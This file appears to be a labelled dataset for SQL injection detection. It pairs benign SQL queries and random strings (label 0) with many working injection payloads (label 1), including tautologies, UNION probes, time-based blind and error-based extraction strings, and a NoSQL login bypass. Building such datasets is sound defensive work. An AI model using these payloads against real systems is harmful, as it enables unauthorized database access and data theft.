Query,Label
SELECT AVG ( fruit ) FROM cream,0
"1"" ) and ( 3020 = 3020 ) *6703 and ( ""hkjf"" = ""hkjf",1
SELECT MIN ( Price ) AS SmallestPriceFROM Products;,0
"1%"" ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
"{""username"": {""$ne"": null}, ""password"": {""$ne"": null}}",1
SELECT * FROM traffic 3,0
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'ldqq' = 'ldqq",1
atiy,0
"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'tmwy' = 'tmwy",1
"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and 'vunt' = 'vunt",1
"1 ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 8529 = 8529",1
SELECT * FROM hold,0
"SELECT longID AS ID, sides AS audience FROM cutting",0
44650,0
1 ) where 2468 = 2468 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1
"INSERT INTO down ( myself, important, coal ) VALUES ( 'while', 'scientific', 'fourth' )",0
"1 where 4468 = 4468 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
84996241v,0
3600,0
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3#",1
SELECT * FROM oil WHERE modern = 'quiet' OR mirror = 'him',0
SELECT * FROM nobody WHERE idea = 'chamber' OR noun = 'four',0
SELECT TOP 3 * FROM engineer WHERE attached = 'circus' SELECT * FROM contain,0
san bartolom de las abiertas,0
1' ) where 3588 = 3588,1
0g83ma7ora,0
"SELECT column_name ( s ) FROM couple,straight",0
SELECT DISTINCT typical FROM discover,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 28080 ) ORDER BY meta_id ASC",0
"iif ( 1483 = 7301,1,1/0 )",1
SELECT * FROM act WHERE believed = 'judge' OR come = 'rose',0
65651817l,0
"1' ) ) ) union all select null,null,null#",1
SELECT * FROM live WHERE NOT pilot = 'cake',0
SELECT * FROM become WHERE spend BETWEEN '1996-07-01' AND '1996-07-31',0
"1 ) ) ) union all select null,null#",1
ja34ico,0
SELECT * FROM valuable ORDER BY yellow DESC,0
"select * from users where id = 1 or "";#"" or 1 = 1 -- 1",1
"1"" ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
SELECT * FROM alive WHERE brief BETWEEN 10 AND 20,0
"1%"" ) ) union all select null,null,null,null--",1
"1%"" ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ""%"" = """,1
SELECT TOP 3 * FROM lips WHERE walk = 'fence',0
SELECT COUNT ( DISTINCT society ) FROM paint,0
"-7306"" or 2081 = 6847",1
3.58067E+15,0
cr48e24n,0
SELECT MIN ( measure ) AS apple FROM dropped,0
"1', ( select 9100 = ( 'qqpjq'|| ( select case 9100 when 9100 then 1 else 0 end from rdb$database ) ||'qzvzq' ) )",1
"-9699"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""dufs"" = ""dufs",1
SELECT * FROM population WHERE question = 'certain',0
"1%"" ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ""%"" = """,1
SELECT * FROM seven ORDER BY swung,0
data' OR '1'='1'/*,1
1' in boolean mode ) and 2006 = 2006,1
"1' ) where 1323 = 1323 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1
c/ san antonio 65 12?a,0
SELECT AVG ( song ) FROM brown SELECT SUM ( better ),0
"SELECT * FROM Customers WHERE Country NOT IN ( 'Germany', 'France', 'UK' ) ;",0
"-8308"" ) union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",1
SELECT * FROM belong 3,0
SELECT * FROM birthday WHERE continued = 'slowly' FETCH FIRST 3 ROWS ONLY,0
DELETE FROM species WHERE monkey = 'somewhere',0
pincel,0
SELECT wait FROM such,0
2.22584E+14,0
SELECT * FROM tears WHERE difference NOT LIKE 'track%',0
SELECT * FROM brother WHERE dirty = 'apple' LIMIT 3,0
"SELECT column_name ( s ) FROM silver,pot",0
SELECT COUNT ( engineerID ) FROM sight,0
"1' ) where 7279 = 7279 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
( select * from ( select ( sleep ( 5 ) ) ) srmq ),1
"1'+ ( select acax where 4169 = 4169 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",1
"1, ( case when 8260 = 8260 then 1 else null end )",1
SELECT option_value FROM wp_options WHERE option_name = 'options_site_logo' LIMIT 1,0
"1%"" ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""%"" = """,1
"1' ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"1' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'snad' like 'snad",1
"1"" ) ) as tybm where 2687 = 2687 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1
1 where 1931 = 1931 and sleep ( 5 ) --,1
"1 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) # dwxl",1
"SELECT DATE_FORMAT ( BirthDate, ""%W %M %e %Y"" ) FROM Employees;",0
SELECT TOP 50 PERCENT * FROM realize,0
"SELECT organizationID AS ID, record AS done FROM twice",0
"UPDATE receive SET face = 'nodded', City = 'cup' WHERE by = pony",0
"SELECT satellites, listen, bottomFROM threw WHERE mighty IS NOT NULL",0
1' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'smrw' like 'smrw,1
"SELECT setting, planned+ ', ' + movement+ ' ' + string+ ', ' + solid AS suggest FROM stove",0
33529,0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",1
1%' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( '%' = ',1
SELECT * FROM differ WHERE breeze = 'another' AND City = 'detail',0
admin' ) or ( '1' = '1'/*,1
SELECT * FROM frame WHERE afternoon = 'rest' AND City = 'bow',0
SELECT airplane,0
"-9987 ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 2114 = 2114",1
"SELECT bat, inch, biggerFROM opinion WHERE show IS NOT NULL",0
"SELECT * FROM driving ORDER BY ants, inside",0
37793,0
vallb remesar,0
"1' ) where 9221 = 9221 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1
SELECT * FROM mouth WHERE copy = 'universe' OR done = 'men',0
FROM ( SELECT DISTINCT enter FROM herself ),0
select ( case when ( 6961 = 7460 ) then 1 else 6961* ( select 6961 from master..sysdatabases ) end ) --,1
"SELECT CustomerName, ContactName, Address FROM Customers WHERE Address IS NOT NULL;",0
"SELECT made,symbol FROM month WHERE ran = 'ill' UNION SELECT try, month FROM death",0
"c/ berruguete 23,",0
1' ) as twny where 9580 = 9580,1
SELECT * FROM rain FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT BIN ( 111 ) ;,0
"SELECT * FROM whom ORDER BY clearly, element",0
66750565b,0
gabbai,0
"1 ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 6556 = 6556",1
"1 ) union all select null,null,null,null,null--",1
DELETE FROM river WHERE furniture = 'record',0
"1"" ) as fkco where 8877 = 8877 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1
"1 ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1
"SELECT * FROM remove ORDER BY knowledge, yellow",0
23550240b,0
"-2667 ) union all select 5848,5848,5848,5848--",1
SELECT * FROM either WHERE changing NOT LIKE '[require]%',0
"-7916' ) ) union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",1
1 ) as nxmd where 8650 = 8650,1
SELECT complex ( s ) FROM blow UNION,0
"-3767' ) as eefl where 8260 = 8260 union all select 8260,8260,8260,8260,8260,8260,8260#",1
1%' ) rlike sleep ( 5 ) and ( '%' = ',1
"SELECT * FROM review ORDER BY told ASC, worth DESC",0
madrigal del monte,0
2.03614E+14,0
1 ) ) ) order by 1#,1
SELECT * FROM ( SELECT his FROM baseball ),0
"1"" ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",1
"select * from users where id = 1 or ""{ ( "" = 1 or 1 = 1 -- 1",1
"1"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""pxix"" = ""pxix",1
"1' in boolean mode ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
SELECT COUNT ( general ) FROM carefully,0
"1' ) ) union all select null,null,null#",1
"SELECT molecular,my FROM attempt WHERE principle = 'far' UNION SELECT want, behind FROM bigger",0
"select * from users where id = 1 +$+ union select null,@@VERSION -- 1",1
SELECT * FROM ago 3 SELECT * FROM express,0
91309762s,0
"1"" ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",1
murad@magadan.org.pe,0
51842682s,0
SELECT * FROM position WHERE rich = 'balance' FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( usID ) FROM blind,0
"1"" ) as dfmm where 7563 = 7563 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"1%"" and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""%"" = """,1
hamzeh,0
SELECT torn ( s ) FROM pile UNION,0
"SELECT * FROM union WHERE either BETWEEN ""information"" AND ""pine""",0
SELECT test ( s ) FROM means LEFT JOIN,0
-4023 or ( 8779 = 5716 ) *5716,1
1' ) ) order by 1--,1
SELECT * FROM imagine WHERE coach = horse,0
or a = a,1
1 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),1
SELECT * FROM note 3,0
detleff3,0
SELECT option_value FROM wp_options WHERE option_name = '_houzez_property_type_2712' LIMIT 1,0
85233754d,0
SELECT * FROM fell WHERE potatoes LIKE '%screen%',0
berber,0
"1%"" ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""%"" = """,1
SELECT * FROM lion FETCH FIRST 3 ROWS ONLY,0
SELECT TOP 3 * FROM plus WHERE next = 'aside' SELECT * FROM create,0
"1%"" ) union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT COUNT ( write ) FROM poet,0
"1' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1
SELECT * FROM baby,0
tro8e0e1!0,0
"1%"" ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"SELECT * FROM gas WHERE dollar BETWEEN ""giant"" AND ""graph""",0
"-2643%"" union all select 7779,7779--",1
SELECT TOP 3 * FROM knife,0
SELECT tales ( s ) FROM important,0
"1"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ""mhfc"" = ""mhfc",1
"SELECT MONTHNAME ( ""2017-06-15 09:34:21"" ) ;",0
SELECT MIN ( food ) AS source FROM both,0
SELECT AVG ( first ) FROM compass SELECT SUM ( chair ),0
SELECT * FROM family WHERE national = 'note' OR her = 'burn',0
"1%"" waitfor delay '0:0:5' and ""%"" = """,1
"SELECT bentID AS ID, matter AS decide FROM second",0
"1%"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( ""%"" = """,1
1 ) ) ) and 9198 = 9198--,1
griffy,0
SELECT * FROM syllable 3 SELECT * FROM crowd,0
"-8410"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""xhzr"" = ""xhzr",1
DELETE FROM cabin WHERE softly = 'compare',0
combos,0
1'+ ( select biqo where 6046 = 6046,1
"1'|| ( select 'ltqo' where 9080 = 9080 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",1
-4137 ) ) as elxu where 5672 = 5672 order by 1--,1
ergo226825e,0
"-1408 ) ) union all select 5715,5715,5715,5715,5715,5715--",1
1 ) where 2223 = 2223,1
SELECT * FROM stream,0
27268,0
"1' and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"-9557%"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""%"" = """,1
1' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'mmow' = 'mmow,1
4.38114E+15,0
SELECT * FROM consist WHERE at BETWEEN 10 AND 20,0
"-6125'|| ( select 'hwnm' where 1428 = 1428 union all select 1428,1428,1428,1428,1428,1428#",1
kresl,0
SELECT * FROM check WHERE locate NOT BETWEEN 'increase' AND 'experience',0
1 ) ) waitfor delay '0:0:5'--,1
simeon,0
"-7528' or make_set ( 3809 = 1821,1821 ) and 'kgch' = 'kgch",1
WHERE ProductID = ANY ( SELECT ProductID FROM OrderDetails WHERE Quantity = 10 ) ;,0
"1' ) where 6774 = 6774 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"1%"" ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""%"" = """,1
1' ) where 2974 = 2974 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ||'",1
SELECT * FROM seldom WHERE led = 'every' AND City = 'fourth',0
75771832b,0
"1' ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
SELECT AVG ( column_name ) FROM table_name WHERE condition ;,0
"barranc de la torrentera, 56, 13?c",0
SELECT Count ( * ) AS education,0
SELECT * FROM women WHERE bowl = 'near' OR sea = 'ship',0
if ( 3593 = 3779 ) select 3593 else drop function qtqy--,1
SELECT AVG ( build ) FROM gradually,0
SELECT * FROM master 3,0
"SELECT tried,accurate,stared FROM fellow LEFT JOIN Orders ON lose.happenID = broke.list ORDER BY tribe.husband",0
"1"" ) ) as jmoy where 9676 = 9676 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1
boix machiavelli,0
20098056n,0
"-9615 ) as dntk where 4780 = 4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",1
-3578' ) ) ) order by 1--,1
"select * from users where id = '1' union select $ _,@@VERSION -- 1'",1
-1711 ) where 9098 = 9098 order by 1#,1
"SELECT * FROM vapor ORDER BY adjective, consider",0
SELECT MIN ( compound ) AS underline FROM crowd,0
1'|| ( select 'ptfi' from dual where 2234 = 2234 and 2006 = 2006,1
SELECT option_value FROM wp_options WHERE option_name = 'options_footer_button_2_link' LIMIT 1,0
9191,0
SELECT TOP 50 PERCENT * FROM run,0
"c/ valdepalitos 155, 5-a",0
peller@arvigar.gs,0
"SELECT * FROM position WHERE broke IN ( 'valuable', 'dinner', 'record' )",0
SELECT MIN ( most ) AS shot FROM safe,0
"paraje antonio de nebrija 39,",0
x' or 1 = 1 or 'x' = 'y,1
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 'xcxr' like 'xcxr",1
"1 ) where 4698 = 4698 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
DELETE FROM difference,0
SELECT your ( s ) FROM onto FULL OUTER JOIN,0
SELECT * FROM halfway WHERE review BETWEEN 10 AND 20,0
"INSERT INTO victory ( bowl, bad, night ) VALUES ( 'brass', 'damage', 'slipped' )",0
"1"" ) where 3250 = 3250 union all select null#",1
isidoro,0
"1"" ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ""tgdu"" = ""tgdu",1
-6377' or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'qcms' like 'qcms,1
j0ctar,0
gaspard-birgel@indorec.kr,0
"1' where 2160 = 2160 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1
1 ) where 4711 = 4711,1
"1 where 8333 = 8333 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1
"SELECT composition, slope+ ', ' + where+ ' ' + truth+ ', ' + carbon AS storm FROM came",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 347696 ) ORDER BY meta_id ASC",0
SELECT * FROM imagine WHERE these = 'goes' FETCH FIRST 3 ROWS ONLY,0
"INSERT INTO shelter ( third, disease, dance ) VALUES ( 'cause', 'wrote', 'eight' )",0
-2495 ) ) as hudw where 4197 = 4197 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1
bohord1r,0
SELECT * FROM coming,0
SELECT * FROM statement WHERE worker BETWEEN 10 AND 20,0
"SELECT column_name ( s ) FROM connected,purple",0
SELECT * FROM hill WHERE NOT beyond = 'great',0
-6165%' ) ) union all select 5384#,1
hana,0
6370,0
SELECT cattle FROM look UNION SELECT adjective FROM piano ORDER BY family,0
"-8588' union all select 2135,2135--",1
SELECT * FROM managed WHERE fish = 'pencil' LIMIT 3,0
mcduffie,0
SELECT * FROM finally WHERE silk = 'six' OR jet = 'rhyme',0
SELECT * FROM do WHERE limited = onto,0
"-5622"" where 7970 = 7970 union all select 7970,7970,7970,7970,7970--",1
group by userid having 1 = 1--,1
1' ) ) and 2401 = 4693 and ( ( 'ssrm' = 'ssrm,1
"SELECT level,aid,voyage FROM hidden LEFT JOIN Orders ON age.cannotID = accept.work ORDER BY outside.train",0
DELETE FROM extra WHERE log = 'population',0
"1 ) ) as npdl where 5796 = 5796 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
SELECT TOP 3 * FROM tax WHERE aboard = 'gulf' SELECT * FROM skin,0
SELECT Count ( * ) AS wet,0
SELECT * FROM wide FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM gently WHERE location = 'tongue' FETCH FIRST 3 ROWS ONLY,0
SELECT garage ( s ) FROM inside SELECT research FROM secret,0
a8errad1r,0
"c/ de las violetas, 104,",0
tristan,0
ergasto,0
SELECT DISTINCT ice FROM cowboy,0
5555,0
SELECT storm ( s ) FROM property SELECT mood ( s ),0
select ( case when ( 4568 = 4241 ) then 4568 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
"SELECT * FROM express ORDER BY independent ASC, love DESC",0
"1' ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"1"" ) ) as nlgn where 3834 = 3834 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
